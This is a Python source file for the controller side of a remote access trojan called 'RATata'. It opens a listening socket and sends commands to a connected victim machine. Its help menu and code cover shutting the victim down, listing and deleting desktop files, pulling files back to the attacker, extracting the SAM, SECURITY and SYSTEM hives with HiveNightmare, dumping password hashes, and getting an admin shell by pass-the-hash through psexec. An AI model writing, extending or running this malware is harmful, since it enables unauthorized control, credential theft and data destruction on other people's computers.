import socket
from tokenize import String
import subprocess
from subprocess import call
import os

def connectToMachine():
    hashToEnter = input("Enter the hash received: ")
    userName = input("Enter the name of the user with admin rights: ")
    dir = os.getcwd()
    cmnd = "python psexec.py -hashes " + hashToEnter + " " + userName + "@" + address[0] + " cmd.exe"
    proc = subprocess.Popen(cmnd, cwd=dir, shell=True)
    proc.wait() #wait until the process (psexec.py) to finish to continue the normal program

logo = """
====================================================================
    ____  ___  ________        __       
   / __ \/   |/_  __/ /_____ _/ /_____ _
  / /_/ / /| | / / / __/ __ `/ __/ __ `/
 / _, _/ ___ |/ / / /_/ /_/ / /_/ /_/ / 
/_/ |_/_/  |_/_/  \__/\__,_/\__/\__,_/  
                                        
====================================================================
Awaiting connection ...
====================================================================
"""

help = """
====================================================================
Available commands: ↓
====================================================================
s                       - Shutdown the victim's computer and closes RATata
openCalc                - Open calculator
showdesktop             - Prints the contents of victim's desktop
retrieveh               - Executes HiveNightmare.exe and extracts the 
                          SAM, SECURITY and SYSTEM hives as files on the victims pc
hashdump                - Dumps the hashes and prints them
getaccess               - Starts an attempt to create an interactive shell 
                          on the victim's machine (you need the hashes and 
                          user's name from hashdump, type "exit" to leave the shell)
DeleteFiles-Desktop     - Prints the contents of the victim's desktop and 
                          ask for the name of the file to be deleted.
                          It then deletes this file. Type "cancel" to abort
SendFiles-Desktop       - Prints the contents of the victim's desktop and 
                          ask for the name of the file to be sent over 
                          to your computer (currently works with .txt files).
                          Type "cancel" to abort
maytheforcebewithyou    - ඞ

terminate               - Close the connection and the program
====================================================================
"""
print(logo)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 1234))
s.listen(5)
clientsocket, address = s.accept()
# now our endpoint knows about the OTHER endpoint.s
print(f"Connection from {address} has been established.")
print("====================================================================")
# Server sends message and waits for reply

# To ensure that the person knows what to use there could be a help option
while True:

    msgToSend = input("Enter your message: ")

    # Creates a new terminal that is connected to the victim machine
    # If the correct account is chosen, this terminal will have admin privileges (privilege escalation)
    if msgToSend == "help":
        print(help)
    elif msgToSend == "getaccess":
        connectToMachine()
    ################################################################
    # Closes the socket and terminates the connection #
    elif msgToSend == "terminate":
        s.close()
        break
    #################################################################
    elif msgToSend == "SendFiles-Desktop":
        clientsocket.send(bytes(msgToSend, "utf-8"))
        msg = clientsocket.recv(2048)
        decodedMsg = msg.decode("utf-8")
        print(decodedMsg)
        msgToSend = input("Enter your message: ")
        if msgToSend == 'cancel':
            clientsocket.send(bytes(msgToSend, "utf-8"))
        else:
            dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop" + "\\"
            f = open(dir + msgToSend, 'wt')
            clientsocket.send(bytes(msgToSend, "utf-8"))
            msg = clientsocket.recv(2048)
            decodedMsg = msg.decode("utf-8")
            while decodedMsg != "done sending":
                print(decodedMsg)
                f.write(decodedMsg)
                msg = clientsocket.recv(2048)
                decodedMsg = msg.decode("utf-8")
            print(decodedMsg)
            f.close()
    else:
        clientsocket.send(bytes(msgToSend,"utf-8"))
        msg = clientsocket.recv(2048)
        decodedMsg = msg.decode("utf-8")
        print(decodedMsg)
        if msgToSend == "s":
            s.close()
            break



